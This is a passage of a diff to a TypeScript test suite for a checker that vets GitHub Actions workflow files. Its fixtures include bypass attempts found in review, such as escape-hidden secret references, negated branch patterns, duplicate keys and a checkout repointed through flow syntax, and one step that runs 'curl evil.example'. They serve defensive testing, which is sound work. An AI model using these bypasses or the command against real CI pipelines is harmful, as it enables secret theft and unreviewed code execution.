@@ -29,6 +29,7 @@ import {
   checkRunAllowlist,
   checkStepExecution,
   checkWorkflowShape,
+  checkNoExpressions,
   checkNodePin,
   checkPermissions,
   checkRunners,
@@ -108,7 +109,7 @@ function workflow(overrides: {
       lines.push(`        if: ${overrides.stepIf}`);
     }
     if (overrides.continueOnError === true) {
-      lines.push("        continue-on-error: true");
+      lines.push('        continue-on-error: "true"');
     }
   }
   const parsed = parseWorkflow(lines.join("\n") + "\n");
@@ -117,34 +118,131 @@ function workflow(overrides: {
   return parsed.root;
 }
 
-describe("TASK-017: the reader refuses what it does not implement", () => {
+describe("TASK-017: YAML is interpreted by a standards parser, and what cannot be represented is refused", () => {
   /**
-   * THE PARSER'S HONESTY IS THE FOUNDATION. Every policy below is a claim about
-   * structure, so a parser that guessed at an unimplemented construct would
-   * make every one of those claims a guess too. These cases pin the refusals.
-   */
-  /**
-   * THE REASON, not merely the refusal.
+   * THE READER'S HONESTY IS THE FOUNDATION. Every policy below is a claim about
+   * structure, so a reader that guessed at a construct would make every one of
+   * those claims a guess too.
    *
-   * Once the grammar closed, removing an individual refusal entry changed no
-   * outcome — `PLAIN_SCALAR` refuses these anyway — so four of these cases
-   * could not tell their guard from its absence. The entries are kept for the
-   * DIAGNOSTIC, so the diagnostic is what is asserted.
+   * THESE CASES CHANGED MEANING AFTER ROUND 8, and the change is the point.
+   * They used to assert that a hand-written parser REFUSED constructs it had not
+   * implemented. Eight rounds showed that list could not be completed — roughly
+   * half the CRITICALs were misreads, structure confidently reported that the
+   * file does not have. So syntax moved to a standards-compliant parser, and
+   * these cases now assert the two halves of the new boundary:
+   *
+   *   1. what the parser READS, it reads CORRECTLY, and the policy receives the
+   *      real structure — the half that used to be a refusal and is now a fact;
+   *   2. what the normalisation CANNOT REPRESENT is refused rather than coerced.
+   *
+   * The attacks those refusals used to stop are not lost. Each is now stopped by
+   * the semantic policy, in the round-labelled block where it was found.
    */
-  for (const [label, source, reason] of [
-    ["a tab", "name: x\n\tfoo: 1\n", /tab/],
-    ["a document marker", "---\nname: x\n", /document marker/],
-    ["an anchor", "name: x\nbase: &anchor 1\n", /anchor/],
-    ["an alias", "name: x\nother: *anchor\n", /alias/],
-    ["a block scalar", "name: x\nscript: |\n  line\n", /block scalar/],
-    ["a flow mapping", "name: x\nwith: { a: 1 }\n", /flow mapping/],
-    ["a flow sequence", 'name: x\nbranches: ["**"]\n', /flow sequence/],
-    ["odd indentation", "name: x\njobs:\n   verify: 1\n", /multiples of two/],
+
+  /** 1. Constructs that used to be refused, now read correctly. */
+  for (const [label, source, read] of [
+    [
+      "a flow sequence",
+      'branches: ["**", "!**"]\n',
+      (root: YamlMap) => assert.deepEqual(get(root, "branches"), { kind: "seq", items: ["**", "!**"] }),
+    ],
+    [
+      "a flow mapping",
+      "with: { node-version: '22.5.0' }\n",
+      (root: YamlMap) => assert.equal(get(get(root, "with"), "node-version"), "22.5.0"),
+    ],
+    [
+      "a nested flow sequence, the round-6 misread",
+      'branches:\n  - "**"\n  - ["!**"]\n',
+      (root: YamlMap) =>
+        assert.deepEqual(get(root, "branches"), { kind: "seq", items: ["**", { kind: "seq", items: ["!**"] }] }),
+    ],
+    [
+      "a block scalar",
+      "script: |\n  first\n  second\n",
+      (root: YamlMap) => assert.equal(get(root, "script"), "first\nsecond\n"),
+    ],
+    [
+      "a single document marker",
+      "---\nname: verify\n",
+      (root: YamlMap) => assert.equal(get(root, "name"), "verify"),
+    ],
+    [
+      "indentation that is not a multiple of two",
+      "jobs:\n   verify: yes-please\n",
+      (root: YamlMap) => assert.equal(get(get(root, "jobs"), "verify"), "yes-please"),
+    ],
+    [
+      "a hex escape, the round-3 misread",
+      'value: "\\x21**"\n',
+      (root: YamlMap) => assert.equal(get(root, "value"), "!**"),
+    ],
+    [
+      "a unicode escape",
+      'value: "\\u0021**"\n',
+      (root: YamlMap) => assert.equal(get(root, "value"), "!**"),
+    ],
+    [
+      "a doubled quote, which YAML reads as one",
+      "name: 'a''b'\n",
+      (root: YamlMap) => assert.equal(get(root, "name"), "a'b"),
+    ],
+    [
+      "a comment after a quote inside a plain scalar, the round-8 misread",
+      'name: foo "bar # baz\n',
+      (root: YamlMap) => assert.equal(get(root, "name"), 'foo "bar'),
+    ],
+    [
+      "a hash inside a quoted scalar, which is not a comment",
+      'name: "a # b"\n',
+      (root: YamlMap) => assert.equal(get(root, "name"), "a # b"),
+    ],
+    [
+      "a hash with no space before it, which is not a comment either",
+      "name: a#b\n",
+      (root: YamlMap) => assert.equal(get(root, "name"), "a#b"),
+    ],
   ] as const) {
-    it(`refuses ${label} rather than approximating it`, () => {
+    it(`reads ${label} correctly instead of guessing`, () => {
       const parsed = parseWorkflow(source);
 
-      assert.equal(parsed.ok, false, `${label} was parsed instead of refused`);
+      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+      if (!parsed.ok) return;
+      read(parsed.root);
+    });
+  }
+
+  /**
+   * 2. What the normalisation refuses.
+   *
+   * A parser hands back a richer world than the policy reasons about, and every
+   * coercion is a chance to report something the file does not say. `1.0` and
+   * `1` are different strings and the same number; a null is not an empty
+   * mapping. These are refused rather than approximated.
+   */
+  for (const [label, source, reason] of [
+    ["an anchor", "base: &anchor value\n", /anchor/],
+    ["an alias", "base: &a value\nother: *a\n", /alias|anchor/],
+    ["an explicit tag", "value: !!str 5\n", /tag/],
+    ["a bare tag", "value: ! something\n", /tag/],
+    ["a null value, the round-8 CRITICAL", "permissions:\njobs:\n  v: x\n", /null/],
+    ["a number, which is not its own spelling", "node-version: 22.5\n", /number/],
+    ["a boolean", "continue-on-error: true\n", /boolean/],
+    ["MORE THAN ONE DOCUMENT", "name: x\n---\nname: y\n", /2 YAML documents/],
+    ["a tab, which YAML forbids as indentation", "name: x\n\tfoo: 1\n", /tab/i],
+    ["an unterminated quote", 'name: "verify\n', /quote/i],
+    ["an invalid escape", 'name: "\\q"\n', /escape/i],
+    ["a duplicate key", "permissions:\n  contents: read\nother: x\npermissions:\n  contents: write\n", /unique/i],
+    ["a duplicate key inside a sequence item", "steps:\n  - run: npm ci\n    run: npm install\n", /unique/i],
+    ["a duplicate key nested in a job", "jobs:\n  v:\n    runs-on: a\n    runs-on: b\n", /unique/i],
+    ["non-breaking spaces used as indentation", "jobs:\n\u00a0\u00a0verify: x\n", /null|not valid YAML/],
+    ["a top level that is not a mapping", "- a\n- b\n", /not a mapping/],
+    ["an empty file", "", /empty/],
+  ] as const) {
+    it(`refuses ${label}`, () => {
+      const parsed = parseWorkflow(source);
+
+      assert.equal(parsed.ok, false, `${label} was represented instead of refused`);
       assert.match(
         parsed.ok === false ? parsed.reason : "",
         reason,
@@ -153,10 +251,45 @@ describe("TASK-017: the reader refuses what it does not implement", () => {
     });
   }
 
+  /**
+   * PARSE FAILURE MEANS REFUSE, NEVER "ABSENT, THEREFORE ALLOWED".
+   *
+   * The direction matters more than the refusal. A reader that turns "I could
+   * not tell" into "there is nothing wrong" is the failure this whole area kept
+   * producing, and it cannot be observed by testing well-formed inputs — so it
+   * is asserted directly: a refused parse yields no document at all, and there
+   * is therefore nothing a policy could be handed and pass.
+   */
+  it("never reports a malformed document as a passing workflow", () => {
+    for (const malformed of ['name: "verify\n', "name: x\n\tfoo: 1\n", "a: 1\na: 2\n", "name: x\n---\nname: y\n"]) {
+      const parsed = parseWorkflow(malformed);
+
+      assert.equal(parsed.ok, false, `${JSON.stringify(malformed)} parsed`);
+      assert.equal("root" in parsed, false, "a refused parse still produced a document");
+    }
+  });
+
   it("parses the shipped workflow, so the refusals above are not refusing everything", () => {
     const parsed = parseWorkflow(SOURCE);
 
     assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+  });
+
+  /**
+   * THE SEAM IS A RE-EXPORT, NOT A SECOND IMPLEMENTATION.
+   *
+   * `workflowPolicy` re-exports the reader so callers have one import for "read
+   * this workflow and judge it". That is a convenience, and the risk in it is
+   * that someone later satisfies a failing case by wrapping or reimplementing
+   * the reader on the policy side, leaving two readers that disagree. Asserting
+   * identity costs one line and makes that divergence impossible to introduce
+   * quietly.
+   */
+  it("re-exports the reader from workflowDocument rather than reimplementing it", async () => {
+    const document = await import("../src/verification/workflowDocument.js");
+
+    assert.equal(parseWorkflow, document.parseWorkflow);
+    assert.equal(get, document.get);
   });
 
   /** Structure, not text: the shipped file really does yield jobs and steps. */
@@ -169,26 +302,20 @@ describe("TASK-017: the reader refuses what it does not implement", () => {
   });
 
   /**
-   * A `#` inside a quoted scalar is not a comment, and QUOTE TRACKING is what
-   * makes that true — not the "preceded by a space" rule, which this very
-   * value satisfies. Worth stating: a mutation removing the space rule leaves
-   * this passing, because the quote state had already skipped the character.
+   * `on` IS A STRING KEY IN YAML 1.2 AND A BOOLEAN IN YAML 1.1, which is why
+   * the parser is pinned to 1.2. Under 1.1 this key would normalise to `true`
+   * and every trigger check would find no `on` at all — the sort of silent
+   * version-dependent misread the new boundary is supposed to remove, so it is
+   * asserted rather than assumed.
    */
-  it("does not truncate a value at a hash inside quotes", () => {
-    const parsed = parseWorkflow('name: "a # b"\n');
+  it("reads `on` as a key rather than the boolean YAML 1.1 would make it", () => {
+    const on = get(shipped(), "on");
 
-    assert.equal(parsed.ok, true);
-    if (!parsed.ok) return;
-    assert.equal(get(parsed.root, "name"), "a # b");
-  });
-
-  /** And a bare `#` with no leading space is part of the value, not a comment. */
-  it("does not truncate a value at a hash with no space before it", () => {
-    const parsed = parseWorkflow("name: a#b\n");
-
-    assert.equal(parsed.ok, true);
-    if (!parsed.ok) return;
-    assert.equal(get(parsed.root, "name"), "a#b");
+    assert.notEqual(on, undefined, "the `on` key was lost to a YAML 1.1 boolean reading");
+    assert.deepEqual(
+      on === undefined || typeof on === "string" || on.kind !== "map" ? [] : on.entries.map(([key]) => key),
+      ["pull_request", "push"],
+    );
   });
 });
 
@@ -708,7 +835,7 @@ describe("TASK-017 round-2: the workflow shape is an allowlist", () => {
   /** The reviewer's four job- and step-level execution controls. */
   for (const [label, after, added] of [
     ["a job-level condition", "  verify:", ["    if: success()"]],
-    ["job-level continue-on-error", "  verify:", ["    continue-on-error: true"]],
+    ["job-level continue-on-error", "  verify:", ['    continue-on-error: "true"']],
     ["job-level permissions", "  verify:", ["    permissions:", "      contents: write"]],
     ["a step-level condition", `      - uses: actions/setup-node@${"b".repeat(40)}`, ["        if: success()"]],
   ] as const) {
@@ -863,37 +990,87 @@ describe("TASK-017 round-2 HIGH 5: only allowlisted commands may run", () => {
  * Refused rather than decoded: a partial decoder handling `\x` but not `\u`
  * would reproduce the defect with a different spelling.
  */
-describe("TASK-017 round-3 CRITICAL: escaped scalars are refused, not misread", () => {
-  for (const [label, escaped] of [
-    ["a hex escape", '"\\x21**"'],
-    ["a unicode escape", '"\\u0021**"'],
-    ["a newline escape", '"a\\nb"'],
-    ["an escaped backslash", '"a\\\\b"'],
+describe("TASK-017 round-3 CRITICAL: escaped scalars are decoded, and the policy judges what they decode to", () => {
+  /**
+   * THIS FINDING IS NOW STOPPED ONE LAYER LOWER, AND STOPPED BETTER.
+   *
+   * The reviewer hid `!**` inside `"\x21**"` and a secret reference inside
+   * `"${{ secrets\x2eS }}"`. The hand-written reader kept the bytes, so the
+   * checks looked at the bytes and found nothing. The fix at the time was to
+   * refuse ANY backslash — correct, but blunt: it refused the construct without
+   * ever understanding the attack.
+   *
+   * A standards parser DECODES the escape, so the policy now sees `!**` and
+   * `${{ secrets.S }}` and refuses them by name. The refusal went from "this
+   * file contains a character I cannot handle" to "this excludes every branch
+   * you just included", which is the same outcome for a better reason.
+   */
+  for (const [label, escaped, decoded] of [
+    ["a hex escape", '"\\x21**"', "!**"],
+    ["a unicode escape", '"\\u0021**"', "!**"],
+    ["a newline escape", '"a\\nb"', "a\nb"],
+    ["an escaped backslash", '"a\\\\b"', "a\\b"],
   ] as const) {
-    it(`refuses ${label}`, () => {
+    it(`decodes ${label} rather than reporting its bytes`, () => {
       const parsed = parseWorkflow(`name: x\nvalue: ${escaped}\n`);
 
-      assert.equal(parsed.ok, false, `${label} was read literally instead of refused`);
-      assert.match(parsed.ok === false ? parsed.reason : "", /backslash/);
+      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+      if (!parsed.ok) return;
+      assert.equal(get(parsed.root, "value"), decoded);
     });
   }
 
   /** The reviewer's exact branch reproduction. */
   it("refuses a branch list hiding a negative pattern behind an escape", () => {
     const parsed = parseWorkflow(
-      ["name: x", "on:", "  push:", "    branches:", '      - "**"', '      - "\\x21**"', ""].join("\n"),
+      // `pull_request` IS DECLARED AND VALID so that only the escaped pattern
+      // can decide this. Without it `checkTriggers` refused first for the
+      // missing event and the case passed whatever the branch list said — the
+      // sixth sibling-guard masking in this task, and one I wrote myself.
+      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
+       "  push:", "    branches:", '      - "**"', '      - "\\x21**"', ""].join("\n"),
     );
+    assert.equal(parsed.ok, true, "the escape should now be decoded, not refused");
+    if (!parsed.ok) return;
 
-    assert.equal(parsed.ok, false, "an escaped negative pattern was read literally");
+    // DECODED: the policy is handed `!**`, not the bytes `\x21**`.
+    assert.deepEqual(get(get(get(parsed.root, "on"), "push"), "branches"), { kind: "seq", items: ["**", "!**"] });
+
+    const verdict = checkTriggers(parsed.root);
+
+    assert.equal(verdict.ok, false, "an escaped negative pattern was accepted");
+    assert.match(verdict.ok === false ? verdict.reason : "", /excludes/);
   });
 
-  /** And the secret reproduction. */
+  /**
+   * And the secret reproduction. The RAW SOURCE never contains `secrets.` — only
+   * the decoded value does — so this case can only be caught by reading the
+   * parsed structure, which is why `checkPermissions` checks both and is given a
+   * clean source string here.
+   */
   it("refuses an input hiding a secret reference behind an escape", () => {
+    const raw = ["name: x", "jobs:", "  v:", "    steps:", "      - with:", '          k: "${{ secrets\\x2eS }}"', ""].join("\n");
+    const parsed = parseWorkflow(raw);
+    assert.equal(parsed.ok, true, "the escape should now be decoded, not refused");
+    if (!parsed.ok) return;
+
+    assert.equal(/secrets\./.test(raw), false, "the fixture no longer hides the reference");
+
+    const verdict = checkPermissions(parsed.root, raw);
+
+    assert.equal(verdict.ok, false, "an escaped secret reference was accepted");
+    assert.match(verdict.ok === false ? verdict.reason : "", /secret/);
+  });
+
+  /** And the expression check catches the same value independently. */
+  it("refuses the decoded expression at the expression check too", () => {
     const parsed = parseWorkflow(
       ["name: x", "jobs:", "  v:", "    steps:", "      - with:", '          k: "${{ secrets\\x2eS }}"', ""].join("\n"),
     );
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
 
-    assert.equal(parsed.ok, false, "an escaped secret reference was read literally");
+    assert.equal(checkNoExpressions(parsed.root).ok, false, "a decoded expression was accepted");
   });
 
   /** The shipped workflow uses no escapes, so the refusals are not universal. */
@@ -907,8 +1084,13 @@ describe("TASK-017: a secret cannot be named, however it is spelled", () => {
    * THREE ROUNDS OF BYPASSES WERE THREE SPELLINGS OF ONE THING:
    * `secrets.NAME`, `secrets['NAME']`, `toJSON(secrets)`, and `github.token`
    * which names no secret while being one. Matching spellings is the losing
-   * game the closed grammar exists to stop playing — an expression is now
-   * refused outright, so every spelling inside one goes with it.
+   * game a closed policy exists to stop playing, so an EXPRESSION is refused
+   * outright and every spelling inside one goes with it.
+   *
+   * THIS MOVED WHEN THE PARSER DID. `${{ ... }}` used to be refused as
+   * unreadable syntax; to a standards parser it is an ordinary string, so the
+   * refusal is now a statement about what this workflow may MEAN rather than
+   * about what the reader can lex. The class is the same and the layer is not.
    */
   for (const [label, value] of [
     ["a dotted secret", "${{ secrets.S }}"],
@@ -917,13 +1099,31 @@ describe("TASK-017: a secret cannot be named, however it is spelled", () => {
     ["the implicit token", "${{ github.token }}"],
     ["any expression at all", "${{ github.sha }}"],
   ] as const) {
-    it(`refuses ${label} before any policy sees it`, () => {
+    it(`refuses ${label}`, () => {
       const parsed = parseWorkflow(`name: x\nvalue: ${value}\n`);
+      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+      if (!parsed.ok) return;
 
-      assert.equal(parsed.ok, false, `${value} was parsed instead of refused`);
-      assert.match(parsed.ok === false ? parsed.reason : "", /expression/);
+      const verdict = checkNoExpressions(parsed.root);
+
+      assert.equal(verdict.ok, false, `${value} was accepted`);
+      assert.match(verdict.ok === false ? verdict.reason : "", /expression/);
     });
   }
+
+  /** An expression hidden in a KEY is still an expression. */
+  it("refuses an expression used as a key", () => {
+    const parsed = parseWorkflow("name: x\n${{ github.token }}: y\n");
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+
+    assert.equal(checkNoExpressions(parsed.root).ok, false, "an expression in key position was accepted");
+  });
+
+  /** NON-VACUITY: the expression check accepts the workflow that ships. */
+  it("accepts the shipped workflow, which uses no expression", () => {
+    assert.equal(checkNoExpressions(shipped()).ok, true);
+  });
 
   /**
    * And `checkPermissions` keeps a case of its own, because the grammar and the
@@ -1147,24 +1347,36 @@ describe("TASK-017: a guarded module may not lose the test that guards it", () =
 });
 
 describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted", () => {
+  /**
+   * EVERY CASE HERE STILL REFUSES, AND NONE OF THEM IS OUR CODE ANY MORE.
+   *
+   * These were hand-written refusals, and each arrived as a defect: the escape
+   * list matched valid FORMS so `\q` sailed through as a literal; duplicate
+   * detection lived on one of the two paths that built mappings, so a duplicate
+   * inside a sequence item was silently resolved to the first value.
+   *
+   * They are now the parser's answers, and they are asserted rather than assumed
+   * — a dependency that stopped enforcing `uniqueKeys` would be a silent
+   * downgrade of a CRITICAL, so the round-4 findings keep their cases.
+   */
   it("refuses an invalid escape, not merely the valid ones", () => {
-    // The refusal list matched valid escape FORMS, so `\q` — which YAML
-    // rejects outright — passed through as a literal.
     const parsed = parseWorkflow('name: "\\q"\n');
 
     assert.equal(parsed.ok, false, "an invalid escape was read literally");
+    assert.match(parsed.ok === false ? parsed.reason : "", /escape/i);
   });
 
   it("refuses an unterminated quoted scalar", () => {
     const parsed = parseWorkflow('name: "verify\n');
 
     assert.equal(parsed.ok, false, "an unterminated quote became part of the value");
-    assert.match(parsed.ok === false ? parsed.reason : "", /unterminated/);
+    assert.match(parsed.ok === false ? parsed.reason : "", /quote/i);
   });
 
   it("refuses non-breaking spaces used as indentation", () => {
-    // `trimStart()` treats U+00A0 as whitespace and YAML does not, so the
-    // reader computed a depth the file does not have.
+    // `trimStart()` treats U+00A0 as whitespace and YAML does not, so the old
+    // reader computed a depth the file does not have. The parser reads it as
+    // part of a scalar, which leaves `jobs:` null — refused either way.
     const parsed = parseWorkflow("jobs:\n\u00a0\u00a0verify: x\n");
 
     assert.equal(parsed.ok, false, "non-ASCII whitespace was counted as indentation");
@@ -1173,8 +1385,9 @@ describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted"
   /**
    * THE CONFIDENT WRONG ANSWER. `get()` returned the FIRST match, so a second
    * `permissions:` granting write was reported as read-only. YAML
-   * implementations disagree about duplicates and GitHub's is not this one, so
-   * refusing is the only honest move.
+   * implementations disagree about duplicates and GitHub's is not necessarily
+   * this one, so refusing is the only honest move — now enforced by the parser's
+   * `uniqueKeys` rather than by a hand-written pass over each mapping.
    */
   it("refuses a mapping that declares the same key twice", () => {
     const parsed = parseWorkflow(
@@ -1182,14 +1395,14 @@ describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted"
     );
 
     assert.equal(parsed.ok, false, "a duplicate key was silently resolved");
-    assert.match(parsed.ok === false ? parsed.reason : "", /more than once/);
+    assert.match(parsed.ok === false ? parsed.reason : "", /unique/i);
   });
 
   /**
    * A SEQUENCE-ITEM MAPPING IS STILL A MAPPING (round-5 review, CRITICAL 1).
    * Duplicate detection lived on the ordinary mapping path only, so
    * `- run: npm ci` followed by `  run: npm install` was read as the first
-   * value and the second silently vanished.
+   * value and the second silently vanished. There is only one mapping path now.
    */
   it("refuses a duplicate key inside a sequence-item mapping", () => {
     const parsed = parseWorkflow(
@@ -1197,7 +1410,7 @@ describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted"
     );
 
     assert.equal(parsed.ok, false, "a duplicate key inside a step was silently resolved");
-    assert.match(parsed.ok === false ? parsed.reason : "", /more than once/);
+    assert.match(parsed.ok === false ? parsed.reason : "", /unique/i);
   });
 
   it("refuses a duplicate key nested inside a job", () => {
@@ -1206,6 +1419,13 @@ describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted"
     );
 
     assert.equal(parsed.ok, false, "a duplicate nested key was silently resolved");
+  });
+
+  /** And a duplicate in FLOW syntax, which the old reader never reached. */
+  it("refuses a duplicate key in a flow mapping", () => {
+    const parsed = parseWorkflow("job: { run: npm ci, run: npm install }\n");
+
+    assert.equal(parsed.ok, false, "a duplicate key in flow syntax was silently resolved");
   });
 
   /** A plain scalar may CONTAIN quotes; only an opening quote makes it quoted. */
@@ -1232,25 +1452,24 @@ describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted"
  */
 
 
-/**
- * TASK-017 round-6 review: two more ways to spell something the reader misread.
- */
 describe("TASK-017 round-6 CRITICAL: context syntax and flow items", () => {
   /**
-   * These two moved to the GRAMMAR. `${{ secrets['S'] }}` and `${{ secrets.S }}`
-   * are refused before any policy sees them, which is stronger than the policy
-   * refusal they used to get — see "a secret cannot be named, however it is
-   * spelled" above. Kept here as a pointer rather than deleted silently,
-   * because a reader looking for the round-6 finding should find where it went.
+   * The two secret spellings moved to the expression check — see "a secret
+   * cannot be named, however it is spelled" above. Kept as a pointer rather
+   * than deleted silently, because a reader looking for the round-6 finding
+   * should find where it went.
    */
-  it("refuses both secret spellings at the grammar, not the policy", () => {
+  it("refuses both secret spellings, now at the policy rather than the grammar", () => {
     for (const value of ["${{ secrets['S'] }}", "${{ secrets.S }}"]) {
       const parsed = parseWorkflow(`name: x\nvalue: ${value}\n`);
-      assert.equal(parsed.ok, false, `${value} was parsed`);
+      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+      if (!parsed.ok) return;
+
+      assert.equal(checkNoExpressions(parsed.root).ok, false, `${value} was accepted`);
     }
   });
 
-  /** A bare `!` is a tag YAML strips and this reader kept. */
+  /** A bare `!` is a tag YAML strips and the old reader kept. */
   it("refuses a bare tag with a space after it", () => {
     const parsed = parseWorkflow("name: x\nvalue: ! something\n");
 
@@ -1258,20 +1477,84 @@ describe("TASK-017 round-6 CRITICAL: context syntax and flow items", () => {
     assert.match(parsed.ok === false ? parsed.reason : "", /tag/);
   });
 
-  /** A flow collection is one wherever it sits, including after a dash. */
-  it("refuses a flow sequence used as a sequence item", () => {
+  /**
+   * THE FLOW-ITEM FINDING, AND A DEFECT THE PARSER REPLACEMENT EXPOSED.
+   *
+   * `- ["!**"]` was read as the STRING `["!**"]`, so the trigger check saw a
+   * harmless pattern. The fix at the time refused flow collections in sequence
+   * items — which made this case unreachable rather than correct.
+   *
+   * Read properly it is a sequence inside a sequence, and that exposed a SECOND
+   * defect one layer up: `checkTriggers` filtered non-strings out of the branch
+   * list and reported on the remainder, so `["**", ["!**"]]` was judged as
+   * `["**"]` and PASSED. Discarding what you cannot interpret and describing
+   * the rest is the same misread the parser replacement exists to end.
+   */
+  it("refuses a branch list whose items are not all patterns", () => {
     const parsed = parseWorkflow(
-      ["on:", "  push:", "    branches:", '      - "**"', '      - ["!**"]', ""].join("\n"),
+      // `pull_request` declared and valid, so only the nested item decides this.
+      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
+       "  push:", "    branches:", '      - "**"', '      - ["!**"]', ""].join("\n"),
     );
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
 
-    assert.equal(parsed.ok, false, "a nested flow sequence was read as a string");
-    assert.match(parsed.ok === false ? parsed.reason : "", /flow collection in a sequence item/);
+    // The structure really is nested — the policy is not being handed a string.
+    assert.deepEqual(get(get(get(parsed.root, "on"), "push"), "branches"), {
+      kind: "seq",
+      items: ["**", { kind: "seq", items: ["!**"] }],
+    });
+
+    const verdict = checkTriggers(parsed.root);
+
+    assert.equal(verdict.ok, false, "a nested sequence was filtered out and the rest reported as fine");
+    assert.match(verdict.ok === false ? verdict.reason : "", /cannot read as a list of patterns/);
   });
 
-  it("refuses a flow mapping used as a sequence item", () => {
-    const parsed = parseWorkflow(["steps:", "  - { run: npm test }", ""].join("\n"));
+  /** The same for pull_request activity types. */
+  it("refuses an activity-type list whose items are not all names", () => {
+    const parsed = parseWorkflow(
+      ["name: x", "on:", "  pull_request:", "    types:", "      - opened", "      - [synchronize]",
+       "  push:", "    branches:", '      - "**"', ""].join("\n"),
+    );
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
 
-    assert.equal(parsed.ok, false, "a flow mapping item was read as a string");
+    const verdict = checkTriggers(parsed.root);
+
+    assert.equal(verdict.ok, false, "a nested sequence in types was filtered out");
+    assert.match(verdict.ok === false ? verdict.reason : "", /cannot read as a list of activity names/);
+  });
+
+  /**
+   * A flow mapping used as a step is now READ, so the with-key allowlist has to
+   * hold in flow syntax exactly as it does in block syntax. The round-2 finding
+   * was a repointed checkout; this is the same attack in the notation the old
+   * reader refused to look at.
+   */
+  it("refuses a flow-mapping step that repoints the checkout", () => {
+    const parsed = parseWorkflow(
+      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:", '      - "**"',
+       "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
+       `      - { uses: "actions/checkout@${"a".repeat(40)}", with: { repository: someone/else } }`, ""].join("\n"),
+    );
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+
+    const verdict = checkWorkflowShape(parsed.root);
+
+    assert.equal(verdict.ok, false, "a flow-mapping step bypassed the with-key allowlist");
+    assert.match(verdict.ok === false ? verdict.reason : "", /repository/);
+  });
+
+  /** And a flow-mapping step still reaches the command allowlist. */
+  it("reads a flow-mapping step as a step", () => {
+    const parsed = parseWorkflow(["jobs:", "  v:", "    steps:", "      - { run: curl evil.example }", ""].join("\n"));
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+
+    assert.deepEqual(runCommands(parsed.root), ["curl evil.example"]);
+    assert.equal(checkRunAllowlist(parsed.root).ok, false, "a flow-mapping command escaped the allowlist");
   });
 
   it("still parses the shipped workflow", () => {
@@ -1280,46 +1563,87 @@ describe("TASK-017 round-6 CRITICAL: context syntax and flow items", () => {
 });
 
 /**
- * TASK-017 round-7 review: the grammar is CLOSED, so not thinking of a
- * construct is the refusing case.
+ * TASK-017 round-7 review: the reviewer's diagnosis, and what became of it.
  *
- * The reviewer's diagnosis was exact — "the hand-written approach can converge
- * only if it enforces a genuinely closed grammar; this implementation has not
- * converged". Six rounds each found another construct the denylist had not
- * anticipated, because a denylist can only hold what somebody thought of.
+ * The diagnosis was exact — "the hand-written approach can converge only if it
+ * enforces a genuinely closed grammar; this implementation has not converged".
+ * Six rounds had each found another construct the denylist had not anticipated,
+ * because a denylist can only hold what somebody thought of. The answer at the
+ * time was to close the scalar grammar: state what is ADMITTED, refuse the rest.
  *
- * A scalar is now what the grammar ADMITS. These cases pin both halves: the
- * things it must refuse, and the ordinary values it must still accept — a
- * grammar that refuses everything would pass the first half and be useless.
+ * Round 8 then found two more defects in it, and the owner's decision was that a
+ * hand-written YAML grammar is the wrong thing to be maintaining at a trust
+ * boundary at all. So the closure moved: SYNTAX is now the parser's problem, and
+ * what stays closed here is the SEMANTIC allowlist — which keys, events,
+ * runners, inputs and commands this workflow may contain.
+ *
+ * These cases are kept because they are still the right questions. Most of these
+ * values are still refused, now by a parser that refuses them for the reason the
+ * YAML spec gives. Two are not, and are read correctly instead.
  */
-describe("TASK-017 round-7 CRITICAL: the scalar grammar is closed", () => {
-  for (const [label, value] of [
-    ["a reserved indicator", "@not-yaml"],
-    ["a block-scalar opener", "|foo"],
-    ["a folded-scalar opener", ">foo"],
-    ["a key-looking value", "foo: bar"],
-    ["an anchor-looking value", "&anchor"],
-    ["an alias-looking value", "*alias"],
-    ["a directive", "%YAML 1.2"],
-    ["a backtick", "`command`"],
-    ["a flow opener", "[a, b]"],
+describe("TASK-017 round-7 CRITICAL: what a scalar may be is not decided by guesswork", () => {
+  /** Still refused, now with the spec's reason rather than ours. */
+  for (const [label, value, reason] of [
+    ["a reserved indicator", "@not-yaml", /reserved/i],
+    ["a block-scalar opener", "|foo", /block scalar/i],
+    ["a folded-scalar opener", ">foo", /block scalar/i],
+    ["a key-looking value", "foo: bar", /nested mappings|not valid YAML/i],
+    ["an anchor-looking value", "&anchor", /anchor/i],
+    ["an alias-looking value", "*alias", /alias/i],
+    ["a directive", "%YAML 1.2", /directive/i],
+    ["a backtick", "`command`", /reserved/i],
   ] as const) {
     it(`refuses ${label}`, () => {
       const parsed = parseWorkflow(`name: ${value}\n`);
 
       assert.equal(parsed.ok, false, `${JSON.stringify(value)} was admitted`);
+      assert.match(
+        parsed.ok === false ? parsed.reason : "",
+        reason,
+        `${label} was refused, but not for the reason that names it`,
+      );
     });
   }
 
   /**
-   * A doubled quote is an escape this reader does not implement. YAML reads
-   * `'a''b'` as `a'b`; reporting `a''b` is a misread, and implementing the rule
-   * invites the next escape nobody thought about.
+   * THESE TWO ARE NO LONGER REFUSED, AND THAT IS THE CORRECTION.
+   *
+   * `[a, b]` is a sequence and `'a''b'` is the three characters `a'b`. The old
+   * grammar refused both because it could not read them, and refusing what you
+   * cannot read is only safe while nothing needs the answer. The policy needs
